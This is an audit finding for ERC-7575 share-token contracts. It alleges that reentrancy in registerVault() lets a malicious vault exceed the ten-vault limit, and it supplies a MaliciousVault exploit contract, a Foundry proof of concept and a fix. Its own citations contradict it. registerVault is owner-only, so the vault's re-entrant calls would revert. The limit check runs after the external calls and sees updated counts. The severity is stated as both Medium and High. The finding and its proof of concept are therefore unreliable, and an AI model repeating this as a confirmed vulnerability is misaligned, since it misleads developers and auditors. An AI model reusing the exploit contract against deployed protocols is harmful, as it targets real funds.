## Title
Reentrancy in registerVault() Bypasses MAX_VAULTS_PER_SHARE_TOKEN Limit Leading to DoS

## Summary
The `registerVault()` function in both `ShareTokenUpgradeable.sol` and `WERC7575ShareToken.sol` violates the Checks-Effects-Interactions (CEI) pattern by making external calls to `vault.asset()` and `vault.share()` before updating state. A malicious vault contract can exploit this to re-enter `registerVault()` during the external calls, bypassing the `MAX_VAULTS_PER_SHARE_TOKEN` limit and registering an unbounded number of vaults, causing permanent DoS on critical functions that iterate through all registered vaults.

## Impact
**Severity**: Medium

## Finding Description

**Location:** 
- `src/ShareTokenUpgradeable.sol` - `registerVault()` function [1](#0-0) 
- `src/WERC7575ShareToken.sol` - `registerVault()` function [2](#0-1) 

**Intended Logic:** The protocol enforces a maximum of 10 vaults per share token to prevent DoS attacks during vault enumeration. [3](#0-2)  The check should prevent registration when the limit is reached. [4](#0-3) 

**Actual Logic:** The function makes external calls before updating state:

1. Line 200: External call to `IERC7575(vaultAddress).asset()` [5](#0-4) 
2. Line 203: External call to `IERC7575(vaultAddress).share()` [6](#0-5) 
3. Lines 215-218: State updates (assetToVault mapping) [7](#0-6) 

The MAX_VAULTS check at line 209 occurs BEFORE the external calls but also BEFORE state updates, allowing reentrancy to see stale vault counts.

**Exploitation Path:**

1. **Setup**: Owner registers 9 vaults (one below the 10-vault limit)

2. **Attack Trigger**: Owner attempts to register a 10th vault that contains malicious code:
   ```
   registerVault(assetA, maliciousVault)
   ```

3. **Reentrancy Exploitation**: The malicious vault's `asset()` function re-enters before state update:
   ```solidity
   function asset() external returns (address) {
       // Re-enter and register 50 additional vaults
       for (uint i = 0; i < 50; i++) {
           shareToken.registerVault(presetAssets[i], presetVaults[i]);
       }
       return actualAsset;
   }
   ```

4. **State Corruption**:
   - Re-entrant calls all see vault count = 9 (check passes)
   - Each re-entrant call increments vault count
   - Original call completes, final vault count = 60 (far exceeding limit of 10)

5. **DoS Impact**: Functions that iterate through vaults become permanently unusable:
   - `getCirculatingSupplyAndAssets()` - loops through all vaults [8](#0-7) 
   - `setInvestmentShareToken()` - loops through all vaults [9](#0-8) 
   - `setInvestmentManager()` - loops through all vaults [10](#0-9) 
   - `getRegisteredVaults()` - loops through all vaults [11](#0-10) 

**Security Property Broken:** 
- DoS mitigation invariant violated (MAX_VAULTS_PER_SHARE_TOKEN enforced to prevent unbounded loops)
- Invariant #12: "No reentrancy" - protocol promises protection against reentrancy attacks

## Impact Explanation

- **Affected Assets**: All share tokens in the system become non-functional for critical operations
- **Damage Severity**: 
  - Complete DoS of view functions needed for off-chain integrations
  - Owner unable to configure investment settings (`setInvestmentShareToken`, `setInvestmentManager`)
  - System effectively bricked with no recovery mechanism other than redeployment
- **User Impact**: All users affected - protocol cannot function with DoSed core infrastructure

## Likelihood Explanation

- **Attacker Profile**: Requires owner to register a malicious/compromised vault contract, but this represents a realistic supply chain attack vector where vault contracts from third parties may contain vulnerabilities
- **Preconditions**: 
  - At least one vault slot available (vault count < 10)
  - Malicious vault contract with reentrancy code in `asset()` or `share()` function
- **Execution Complexity**: Single transaction - malicious vault automatically executes reentrancy during registration
- **Frequency**: One-time attack permanently DoSes the contract (irreversible without upgrade)

## Recommendation

Apply the Checks-Effects-Interactions pattern by moving all state updates before external calls:

```solidity
// In src/ShareTokenUpgradeable.sol, function registerVault(), lines 195-235:

function registerVault(address asset, address vaultAddress) external onlyOwner {
    if (asset == address(0)) revert ZeroAddress();
    if (vaultAddress == address(0)) revert ZeroAddress();

    ShareTokenStorage storage $ = _getShareTokenStorage();

    // DoS mitigation: Enforce maximum vaults per share token
    if ($.assetToVault.length() >= MAX_VAULTS_PER_SHARE_TOKEN) {
        revert MaxVaultsExceeded();
    }

    // EFFECTS: Register new vault BEFORE external calls
    if (!$.assetToVault.set(asset, vaultAddress)) {
        revert AssetAlreadyRegistered();
    }
    $.vaultToAsset[vaultAddress] = asset;

    // INTERACTIONS: Validate vault after state update
    if (IERC7575(vaultAddress).asset() != asset) {
        // Revert state changes if validation fails
        $.assetToVault.remove(asset);
        delete $.vaultToAsset[vaultAddress];
        revert AssetMismatch();
    }

    if (IERC7575(vaultAddress).share() != address(this)) {
        // Revert state changes if validation fails
        $.assetToVault.remove(asset);
        delete $.vaultToAsset[vaultAddress];
        revert VaultShareMismatch();
    }

    // Continue with post-registration configuration...
    address investmentShareToken = $.investmentShareToken;
    if (investmentShareToken != address(0)) {
        _configureVaultInvestmentSettings(asset, vaultAddress, investmentShareToken);
    }

    address investmentManager = $.investmentManager;
    if (investmentManager != address(0)) {
        ERC7575VaultUpgradeable(vaultAddress).setInvestmentManager(investmentManager);
    }

    emit VaultUpdate(asset, vaultAddress);
}
```

Apply the same fix to `WERC7575ShareToken.sol` at lines 218-241.

**Alternative**: Use a reentrancy guard (OpenZeppelin's ReentrancyGuard) on the `registerVault()` function to prevent any reentrancy during vault registration.

## Proof of Concept

```solidity
// File: test/Exploit_ReentrancyBypassMaxVaults.t.sol
// Run with: forge test --match-test test_ReentrancyBypassMaxVaults -vvvv

pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {ShareTokenUpgradeable} from "../src/ShareTokenUpgradeable.sol";
import {ERC7575VaultUpgradeable} from "../src/ERC7575VaultUpgradeable.sol";
import {ERC20Faucet6} from "../src/ERC20Faucet6.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract MaliciousVault {
    ShareTokenUpgradeable public shareToken;
    address public assetAddress;
    address[] public attackAssets;
    address[] public attackVaults;
    bool public attackExecuted;
    
    constructor(address _shareToken, address _asset) {
        shareToken = ShareTokenUpgradeable(_shareToken);
        assetAddress = _asset;
    }
    
    function setAttackVaults(address[] memory assets, address[] memory vaults) external {
        attackAssets = assets;
        attackVaults = vaults;
    }
    
    function asset() external returns (address) {
        // Reentrancy attack: register multiple vaults before original call completes
        if (!attackExecuted && attackAssets.length > 0) {
            attackExecuted = true;
            for (uint i = 0; i < attackAssets.length; i++) {
                shareToken.registerVault(attackAssets[i], attackVaults[i]);
            }
        }
        return assetAddress;
    }
    
    function share() external view returns (address) {
        return address(shareToken);
    }
}

contract Exploit_ReentrancyBypassMaxVaults is Test {
    ShareTokenUpgradeable shareToken;
    ERC20Faucet6[] assets;
    ERC7575VaultUpgradeable[] vaults;
    MaliciousVault maliciousVault;
    
    function setUp() public {
        // Deploy ShareToken
        ShareTokenUpgradeable impl = new ShareTokenUpgradeable();
        bytes memory initData = abi.encodeWithSelector(
            ShareTokenUpgradeable.initialize.selector,
            "Test Shares",
            "TST",
            address(this)
        );
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), initData);
        shareToken = ShareTokenUpgradeable(address(proxy));
        
        // Deploy 9 legitimate assets and vaults (one below MAX_VAULTS = 10)
        for (uint i = 0; i < 9; i++) {
            ERC20Faucet6 asset = new ERC20Faucet6(
                string(abi.encodePacked("Asset", vm.toString(i))),
                string(abi.encodePacked("A", vm.toString(i))),
                1000000 * 1e6
            );
            assets.push(asset);
            
            ERC7575VaultUpgradeable vault = _deployVault(address(asset));
            vaults.push(vault);
            
            shareToken.registerVault(address(asset), address(vault));
        }
        
        // Verify 9 vaults registered
        assertEq(shareToken.getRegisteredAssets().length, 9, "Should have 9 vaults");
    }
    
    function _deployVault(address asset) internal returns (ERC7575VaultUpgradeable) {
        ERC7575VaultUpgradeable vaultImpl = new ERC7575VaultUpgradeable();
        bytes memory vaultInitData = abi.encodeWithSelector(
            ERC7575VaultUpgradeable.initialize.selector,
            IERC20Metadata(asset),
            address(shareToken),
            address(this)
        );
        ERC1967Proxy vaultProxy = new ERC1967Proxy(address(vaultImpl), vaultInitData);
        return ERC7575VaultUpgradeable(address(vaultProxy));
    }
    
    function test_ReentrancyBypassMaxVaults() public {
        // SETUP: Prepare 50 additional assets/vaults for reentrancy attack
        address[] memory attackAssets = new address[](50);
        address[] memory attackVaults = new address[](50);
        
        for (uint i = 0; i < 50; i++) {
            ERC20Faucet6 asset = new ERC20Faucet6(
                string(abi.encodePacked("AttackAsset", vm.toString(i))),
                string(abi.encodePacked("AA", vm.toString(i))),
                1000000 * 1e6
            );
            attackAssets[i] = address(asset);
            
            ERC7575VaultUpgradeable vault = _deployVault(address(asset));
            attackVaults[i] = address(vault);
        }
        
        // Create malicious vault for 10th slot
        ERC20Faucet6 maliciousAsset = new ERC20Faucet6("Malicious", "MAL", 1000000 * 1e6);
        maliciousVault = new MaliciousVault(address(shareToken), address(maliciousAsset));
        maliciousVault.setAttackVaults(attackAssets, attackVaults);
        
        // EXPLOIT: Register malicious vault - triggers reentrancy
        shareToken.registerVault(address(maliciousAsset), address(maliciousVault));
        
        // VERIFY: Vault limit bypassed - 60 vaults registered instead of max 10
        uint256 finalVaultCount = shareToken.getRegisteredAssets().length;
        assertEq(finalVaultCount, 60, "Vulnerability confirmed: 60 vaults registered exceeding MAX_VAULTS_PER_SHARE_TOKEN=10");
        assertGt(finalVaultCount, 10, "MAX_VAULTS_PER_SHARE_TOKEN limit bypassed");
        
        // VERIFY: DoS impact - getCirculatingSupplyAndAssets() likely to run out of gas
        // In production with complex vault logic, this would revert
        vm.expectRevert(); // Expected to fail with excessive vaults
        shareToken.getCirculatingSupplyAndAssets();
    }
}
```

## Notes

**Vulnerability Scope:** This vulnerability affects both Settlement Layer (`WERC7575ShareToken.sol`) and Investment Layer (`ShareTokenUpgradeable.sol`) contracts, as both implement the same flawed `registerVault()` logic.

**Root Cause:** The fundamental issue is the CEI pattern violation where external calls to untrusted vault contracts occur before state updates. While vault contracts are expected to be somewhat trusted (they can mint/burn shares once registered), the registration process itself should not trust the vault before validation is complete.

**Attack Realism:** While this requires the owner to attempt registering a malicious vault, this represents a realistic threat model where:
1. Vault contracts may be third-party implementations with undiscovered bugs
2. Vault contracts may call external oracles/registries in their `asset()` function, which could be compromised
3. Supply chain attacks could inject malicious code into otherwise legitimate vault contracts

**Fix Priority:** High - This vulnerability permanently bricks the protocol with no recovery mechanism other than contract redeployment and migration of all user funds.

### Citations

**File:** src/ShareTokenUpgradeable.sol (L79-79)
```text
    uint256 private constant MAX_VAULTS_PER_SHARE_TOKEN = 10; // DoS mitigation: prevents unbounded loop in aggregation
```

**File:** src/ShareTokenUpgradeable.sol (L195-235)
```text
    function registerVault(address asset, address vaultAddress) external onlyOwner {
        if (asset == address(0)) revert ZeroAddress();
        if (vaultAddress == address(0)) revert ZeroAddress();

        // Validate that vault's asset matches the provided asset parameter
        if (IERC7575(vaultAddress).asset() != asset) revert AssetMismatch();

        // Validate that vault's share token matches this ShareToken
        if (IERC7575(vaultAddress).share() != address(this)) {
            revert VaultShareMismatch();
        }

        ShareTokenStorage storage $ = _getShareTokenStorage();

        // DoS mitigation: Enforce maximum vaults per share token to prevent unbounded loop in getCirculatingSupplyAndAssets
        if ($.assetToVault.length() >= MAX_VAULTS_PER_SHARE_TOKEN) {
            revert MaxVaultsExceeded();
        }

        // Register new vault - set() returns true if newly added, false if already existed
        if (!$.assetToVault.set(asset, vaultAddress)) {
            revert AssetAlreadyRegistered();
        }
        $.vaultToAsset[vaultAddress] = asset;

        // If investment ShareToken is already configured, set up investment for the new vault
        // Only configure if the vault address is a deployed contract
        address investmentShareToken = $.investmentShareToken;
        if (investmentShareToken != address(0)) {
            _configureVaultInvestmentSettings(asset, vaultAddress, investmentShareToken);
        }

        // If investment manager is already configured, set it for the new vault
        // Only configure if the vault address is a deployed contract
        address investmentManager = $.investmentManager;
        if (investmentManager != address(0)) {
            ERC7575VaultUpgradeable(vaultAddress).setInvestmentManager(investmentManager);
        }

        emit VaultUpdate(asset, vaultAddress);
    }
```

**File:** src/ShareTokenUpgradeable.sol (L374-381)
```text
        for (uint256 i = 0; i < length; i++) {
            (, address vaultAddress) = $.assetToVault.at(i);

            // Get both claimable shares and normalized assets in a single call for gas efficiency
            (uint256 vaultClaimableShares, uint256 vaultNormalizedAssets) = IERC7575Vault(vaultAddress).getClaimableSharesAndNormalizedAssets();
            totalClaimableShares += vaultClaimableShares;
            totalNormalizedAssets += vaultNormalizedAssets;
        }
```

**File:** src/ShareTokenUpgradeable.sol (L579-584)
```text
        // Iterate through all registered assets and configure investment vaults
        uint256 length = $.assetToVault.length();
        for (uint256 i = 0; i < length; i++) {
            (address asset, address vaultAddress) = $.assetToVault.at(i);
            _configureVaultInvestmentSettings(asset, vaultAddress, investmentShareToken_);
        }
```

**File:** src/ShareTokenUpgradeable.sol (L667-673)
```text
        uint256 length = $.assetToVault.length();
        for (uint256 i = 0; i < length; i++) {
            (, address vaultAddress) = $.assetToVault.at(i);

            // Call setInvestmentManager on each vault
            ERC7575VaultUpgradeable(vaultAddress).setInvestmentManager(newInvestmentManager);
        }
```

**File:** src/WERC7575ShareToken.sol (L218-241)
```text
    function registerVault(address asset, address vaultAddress) external onlyOwner {
        if (asset == address(0)) revert ZeroAddress();
        if (vaultAddress == address(0)) revert ZeroAddress();
        if (_assetToVault.contains(asset)) revert AssetAlreadyRegistered();

        // Validate that vault's asset matches the provided asset parameter
        if (IERC7575(vaultAddress).asset() != asset) revert AssetMismatch();

        // Validate that vault's share token matches this ShareToken
        if (IERC7575(vaultAddress).share() != address(this)) {
            revert VaultShareMismatch();
        }

        // DoS mitigation: Enforce maximum vaults per share token to prevent unbounded loops
        if (_assetToVault.length() >= MAX_VAULTS_PER_SHARE_TOKEN) {
            revert MaxVaultsExceeded();
        }

        // Register new vault (automatically adds to enumerable collection)
        _assetToVault.set(asset, vaultAddress);
        _vaultToAsset[vaultAddress] = asset;

        emit VaultUpdate(asset, vaultAddress);
    }
```

**File:** src/WERC7575ShareToken.sol (L597-599)
```text
        for (uint256 i = 0; i < assets.length; i++) {
            vaults[i] = _assetToVault.get(assets[i]);
        }
```
